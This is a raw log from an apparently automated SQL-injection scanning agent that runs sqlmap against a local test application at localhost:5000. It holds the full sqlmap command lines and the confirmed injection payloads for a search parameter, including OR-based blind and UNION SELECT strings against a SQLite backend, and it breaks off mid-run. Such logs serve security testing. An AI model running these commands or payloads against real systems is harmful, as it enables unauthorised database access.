[18:51:55] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:55] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:51:55] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:51:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:51:56] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:51:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:51:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:51:56] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:51:57] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:51:57] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:51:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:51:58] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:51:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:51:59] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:52:00] [WARNING] parameter 'Host' does not seem to be injectable
[18:52:00] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:52:00] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 2314 times

[*] ending @ 18:52:00 /2025-09-26/

2025-09-26 18:52:00,326 - INFO - No clear injection detected during discovery for http://localhost:5000/api/user/1
2025-09-26 18:52:00,326 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/search --data q=test
2025-09-26 18:52:03,963 - INFO -         ___
2025-09-26 18:52:03,963 - INFO -        __H__
2025-09-26 18:52:03,963 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:03,963 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:52:03,963 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 18:52:03,963 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:03,963 - INFO - 
2025-09-26 18:52:03,995 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:03,995 - INFO - 
2025-09-26 18:52:03,995 - INFO - [*] starting @ 18:52:03 /2025-09-26/
2025-09-26 18:52:04,003 - INFO - 
2025-09-26 18:52:06,559 - INFO - [18:52:06] [INFO] flushing session file
2025-09-26 18:52:06,569 - INFO - [18:52:06] [INFO] testing connection to the target URL
2025-09-26 18:52:06,659 - INFO - [18:52:06] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:52:06,669 - INFO - [18:52:06] [INFO] testing if the target URL content is stable
2025-09-26 18:52:07,109 - INFO - [18:52:07] [INFO] target URL content is stable
2025-09-26 18:52:07,109 - INFO - [18:52:07] [INFO] testing if POST parameter 'q' is dynamic
2025-09-26 18:52:07,152 - INFO - [18:52:07] [WARNING] POST parameter 'q' does not appear to be dynamic
2025-09-26 18:52:07,180 - INFO - [18:52:07] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
2025-09-26 18:52:07,212 - INFO - [18:52:07] [INFO] testing for SQL injection on POST parameter 'q'
2025-09-26 18:52:07,342 - INFO - [18:52:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:52:07,475 - INFO - [18:52:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:52:07,527 - INFO - [18:52:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:52:07,595 - INFO - [18:52:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:52:07,661 - INFO - [18:52:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:52:07,733 - INFO - [18:52:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:52:07,799 - INFO - [18:52:07] [INFO] testing 'Generic inline queries'
2025-09-26 18:52:07,817 - INFO - [18:52:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:52:07,856 - INFO - [18:52:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:52:07,893 - INFO - [18:52:07] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:52:07,929 - INFO - [18:52:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:52:07,983 - INFO - [18:52:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:52:08,033 - INFO - [18:52:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:52:08,086 - INFO - [18:52:08] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:52:08,136 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:52:08,136 - INFO - [18:52:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:52:08,182 - INFO - [18:52:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
2025-09-26 18:52:08,223 - INFO - [18:52:08] [INFO] target URL appears to have 2 columns in query
2025-09-26 18:52:08,239 - INFO - [18:52:08] [WARNING] applying generic concatenation (CONCAT)
2025-09-26 18:52:08,268 - INFO - [18:52:08] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
2025-09-26 18:52:08,283 - INFO - [18:52:08] [INFO] checking if the injection point on POST parameter 'q' is a false positive
2025-09-26 18:52:08,422 - INFO - POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 18:52:08,426 - INFO - sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
2025-09-26 18:52:08,432 - INFO - ---
2025-09-26 18:52:08,432 - INFO - Parameter: q (POST)
2025-09-26 18:52:08,432 - INFO -     Type: UNION query
2025-09-26 18:52:08,432 - INFO -     Title: Generic UNION query (NULL) - 2 columns
2025-09-26 18:52:08,432 - INFO -     Payload: q=test' UNION ALL SELECT CONCAT(CONCAT('qkbjq','yqQYtuDpJAFAJTrDBkOgbfnIbNeleXqATAoRmEtO'),'qkbbq'),NULL-- YJZE
2025-09-26 18:52:08,432 - INFO - ---
2025-09-26 18:52:08,436 - INFO - [18:52:08] [INFO] testing MySQL
2025-09-26 18:52:08,464 - INFO - [18:52:08] [WARNING] the back-end DBMS is not MySQL
2025-09-26 18:52:08,464 - INFO - [18:52:08] [INFO] testing Oracle
2025-09-26 18:52:08,488 - INFO - [18:52:08] [WARNING] the back-end DBMS is not Oracle
2025-09-26 18:52:08,488 - INFO - [18:52:08] [INFO] testing PostgreSQL
2025-09-26 18:52:08,506 - INFO - [18:52:08] [WARNING] the back-end DBMS is not PostgreSQL
2025-09-26 18:52:08,506 - INFO - [18:52:08] [INFO] testing Microsoft SQL Server
2025-09-26 18:52:08,528 - INFO - [18:52:08] [WARNING] the back-end DBMS is not Microsoft SQL Server
2025-09-26 18:52:08,528 - INFO - [18:52:08] [INFO] testing SQLite
2025-09-26 18:52:08,548 - INFO - [18:52:08] [INFO] confirming SQLite
2025-09-26 18:52:08,563 - INFO - [18:52:08] [INFO] actively fingerprinting SQLite
2025-09-26 18:52:08,587 - INFO - [18:52:08] [INFO] the back-end DBMS is SQLite
2025-09-26 18:52:08,587 - INFO - back-end DBMS: SQLite
2025-09-26 18:52:08,587 - INFO - [18:52:08] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:08,587 - INFO - 500 (Internal Server Error) - 45 times
2025-09-26 18:52:08,587 - INFO - [18:52:08] [INFO] fetched data logged to text files under 'C:\Users\Ronald Wilson\AppData\Local\sqlmap\output\localhost'
2025-09-26 18:52:08,587 - INFO - 
2025-09-26 18:52:08,587 - INFO - [*] ending @ 18:52:08 /2025-09-26/
2025-09-26 18:52:08,587 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/search --data q=test
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:03 /2025-09-26/

[18:52:06] [INFO] flushing session file
[18:52:06] [INFO] testing connection to the target URL
[18:52:06] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:52:06] [INFO] testing if the target URL content is stable
[18:52:07] [INFO] target URL content is stable
[18:52:07] [INFO] testing if POST parameter 'q' is dynamic
[18:52:07] [WARNING] POST parameter 'q' does not appear to be dynamic
[18:52:07] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[18:52:07] [INFO] testing for SQL injection on POST parameter 'q'
[18:52:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:52:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:52:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:52:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:52:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:52:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:52:07] [INFO] testing 'Generic inline queries'
[18:52:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:52:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:52:07] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:52:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:52:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:52:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:52:08] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:52:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:52:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:52:08] [INFO] target URL appears to have 2 columns in query
[18:52:08] [WARNING] applying generic concatenation (CONCAT)
[18:52:08] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[18:52:08] [INFO] checking if the injection point on POST parameter 'q' is a false positive
POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: q (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: q=test' UNION ALL SELECT CONCAT(CONCAT('qkbjq','yqQYtuDpJAFAJTrDBkOgbfnIbNeleXqATAoRmEtO'),'qkbbq'),NULL-- YJZE
---
[18:52:08] [INFO] testing MySQL
[18:52:08] [WARNING] the back-end DBMS is not MySQL
[18:52:08] [INFO] testing Oracle
[18:52:08] [WARNING] the back-end DBMS is not Oracle
[18:52:08] [INFO] testing PostgreSQL
[18:52:08] [WARNING] the back-end DBMS is not PostgreSQL
[18:52:08] [INFO] testing Microsoft SQL Server
[18:52:08] [WARNING] the back-end DBMS is not Microsoft SQL Server
[18:52:08] [INFO] testing SQLite
[18:52:08] [INFO] confirming SQLite
[18:52:08] [INFO] actively fingerprinting SQLite
[18:52:08] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:52:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 45 times
[18:52:08] [INFO] fetched data logged to text files under 'C:\Users\Ronald Wilson\AppData\Local\sqlmap\output\localhost'

[*] ending @ 18:52:08 /2025-09-26/

2025-09-26 18:52:08,797 - INFO - Flushed sqlmap session for http://localhost:5000/search (log: attack-logs-dynamic\Search_Users_flush.log)
2025-09-26 18:52:08,797 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --technique BU
2025-09-26 18:52:14,092 - INFO -         ___
2025-09-26 18:52:14,093 - INFO -        __H__
2025-09-26 18:52:14,097 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:14,097 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 18:52:14,098 - INFO - |___|_  [.]_|_|_|__,|  _|
2025-09-26 18:52:14,098 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:14,098 - INFO - 
2025-09-26 18:52:14,130 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:14,131 - INFO - 
2025-09-26 18:52:14,131 - INFO - [*] starting @ 18:52:14 /2025-09-26/
2025-09-26 18:52:14,131 - INFO - 
2025-09-26 18:52:17,760 - INFO - [18:52:17] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
2025-09-26 18:52:18,772 - INFO - [18:52:18] [INFO] testing connection to the target URL
2025-09-26 18:52:18,849 - INFO - [18:52:18] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:52:18,870 - INFO - [18:52:18] [INFO] testing if the target URL content is stable
2025-09-26 18:52:19,307 - INFO - [18:52:19] [INFO] target URL content is stable
2025-09-26 18:52:19,345 - INFO - [18:52:19] [INFO] testing if POST parameter 'q' is dynamic
2025-09-26 18:52:19,500 - INFO - [18:52:19] [WARNING] POST parameter 'q' does not appear to be dynamic
2025-09-26 18:52:19,595 - INFO - [18:52:19] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
2025-09-26 18:52:19,699 - INFO - [18:52:19] [INFO] testing for SQL injection on POST parameter 'q'
2025-09-26 18:52:19,861 - INFO - [18:52:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:52:21,121 - INFO - [18:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:52:22,055 - INFO - [18:52:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:52:22,098 - INFO - [18:52:22] [INFO] POST parameter 'q' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
2025-09-26 18:52:22,425 - INFO - [18:52:22] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
2025-09-26 18:52:22,426 - INFO - it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 18:52:22,458 - INFO - [18:52:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 18:52:22,458 - INFO - [18:52:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 18:52:22,486 - INFO - [18:52:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
2025-09-26 18:52:22,531 - INFO - [18:52:22] [INFO] target URL appears to have 2 columns in query
2025-09-26 18:52:22,576 - INFO - [18:52:22] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
2025-09-26 18:52:22,583 - INFO - [18:52:22] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
2025-09-26 18:52:22,584 - INFO - POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 18:52:22,585 - INFO - sqlmap identified the following injection point(s) with a total of 230 HTTP(s) requests:
2025-09-26 18:52:22,585 - INFO - ---
2025-09-26 18:52:22,585 - INFO - Parameter: q (POST)
2025-09-26 18:52:22,585 - INFO -     Type: boolean-based blind
2025-09-26 18:52:22,585 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
2025-09-26 18:52:22,585 - INFO -     Payload: q=test' OR NOT 4394=4394-- Trsa
2025-09-26 18:52:22,585 - INFO - 
2025-09-26 18:52:22,585 - INFO -     Type: UNION query
2025-09-26 18:52:22,585 - INFO -     Title: Generic UNION query (NULL) - 2 columns
2025-09-26 18:52:22,585 - INFO -     Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
2025-09-26 18:52:22,585 - INFO - ---
2025-09-26 18:52:22,585 - INFO - [18:52:22] [INFO] testing SQLite
2025-09-26 18:52:22,608 - INFO - [18:52:22] [INFO] confirming SQLite
2025-09-26 18:52:22,617 - INFO - [18:52:22] [INFO] actively fingerprinting SQLite
2025-09-26 18:52:22,637 - INFO - [18:52:22] [INFO] the back-end DBMS is SQLite
2025-09-26 18:52:22,637 - INFO - back-end DBMS: SQLite
2025-09-26 18:52:22,637 - INFO - [18:52:22] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:22,637 - INFO - 500 (Internal Server Error) - 87 times
2025-09-26 18:52:22,637 - INFO - [18:52:22] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'
2025-09-26 18:52:22,637 - INFO - 
2025-09-26 18:52:22,637 - INFO - [*] ending @ 18:52:22 /2025-09-26/
2025-09-26 18:52:22,637 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:14 /2025-09-26/

[18:52:17] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
[18:52:18] [INFO] testing connection to the target URL
[18:52:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:52:18] [INFO] testing if the target URL content is stable
[18:52:19] [INFO] target URL content is stable
[18:52:19] [INFO] testing if POST parameter 'q' is dynamic
[18:52:19] [WARNING] POST parameter 'q' does not appear to be dynamic
[18:52:19] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[18:52:19] [INFO] testing for SQL injection on POST parameter 'q'
[18:52:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:52:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:52:22] [INFO] POST parameter 'q' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
[18:52:22] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:52:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:52:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:52:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:52:22] [INFO] target URL appears to have 2 columns in query
[18:52:22] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[18:52:22] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 230 HTTP(s) requests:
---
Parameter: q (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: q=test' OR NOT 4394=4394-- Trsa

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
---
[18:52:22] [INFO] testing SQLite
[18:52:22] [INFO] confirming SQLite
[18:52:22] [INFO] actively fingerprinting SQLite
[18:52:22] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:52:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 87 times
[18:52:22] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'

[*] ending @ 18:52:22 /2025-09-26/

2025-09-26 18:52:23,067 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Search_Users_discovery.log
2025-09-26 18:52:23,067 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --dbs
2025-09-26 18:52:27,792 - INFO -         ___
2025-09-26 18:52:27,792 - INFO -        __H__
2025-09-26 18:52:27,792 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:27,792 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:52:27,792 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 18:52:27,792 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:27,823 - INFO - 
2025-09-26 18:52:27,854 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:27,863 - INFO - 
2025-09-26 18:52:27,869 - INFO - [*] starting @ 18:52:27 /2025-09-26/
2025-09-26 18:52:27,869 - INFO - 
2025-09-26 18:52:30,294 - INFO - [18:52:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
2025-09-26 18:52:30,980 - INFO - [18:52:30] [INFO] resuming back-end DBMS 'sqlite'
2025-09-26 18:52:31,000 - INFO - [18:52:30] [INFO] testing connection to the target URL
2025-09-26 18:52:31,066 - INFO - sqlmap resumed the following injection point(s) from stored session:
2025-09-26 18:52:31,066 - INFO - ---
2025-09-26 18:52:31,066 - INFO - Parameter: q (POST)
2025-09-26 18:52:31,066 - INFO -     Type: boolean-based blind
2025-09-26 18:52:31,066 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
2025-09-26 18:52:31,066 - INFO -     Payload: q=test' OR NOT 4394=4394-- Trsa
2025-09-26 18:52:31,081 - INFO - 
2025-09-26 18:52:31,084 - INFO -     Type: UNION query
2025-09-26 18:52:31,084 - INFO -     Title: Generic UNION query (NULL) - 2 columns
2025-09-26 18:52:31,084 - INFO -     Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
2025-09-26 18:52:31,084 - INFO - ---
2025-09-26 18:52:31,084 - INFO - [18:52:31] [INFO] the back-end DBMS is SQLite
2025-09-26 18:52:31,084 - INFO - back-end DBMS: SQLite
2025-09-26 18:52:31,084 - INFO - [18:52:31] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
2025-09-26 18:52:31,084 - INFO - [18:52:31] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'
2025-09-26 18:52:31,084 - INFO - 
2025-09-26 18:52:31,084 - INFO - [*] ending @ 18:52:31 /2025-09-26/
2025-09-26 18:52:31,084 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:27 /2025-09-26/

[18:52:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
[18:52:30] [INFO] resuming back-end DBMS 'sqlite' 
[18:52:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: q (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: q=test' OR NOT 4394=4394-- Trsa

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
---
[18:52:31] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:52:31] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:52:31] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'

[*] ending @ 18:52:31 /2025-09-26/

2025-09-26 18:52:31,294 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Search_Users_dbs.log
2025-09-26 18:52:31,296 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/users -H 'Content-Type: application/json' --data '{"email": "test"}'
2025-09-26 18:52:35,359 - INFO -         ___
2025-09-26 18:52:35,359 - INFO -        __H__
2025-09-26 18:52:35,359 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:35,359 - INFO - |_ -| . [.]     | .'| . |
2025-09-26 18:52:35,359 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:52:35,359 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:35,359 - INFO - 
2025-09-26 18:52:35,396 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:35,396 - INFO - 
2025-09-26 18:52:35,396 - INFO - [*] starting @ 18:52:35 /2025-09-26/
2025-09-26 18:52:35,396 - INFO - 
2025-09-26 18:52:38,059 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
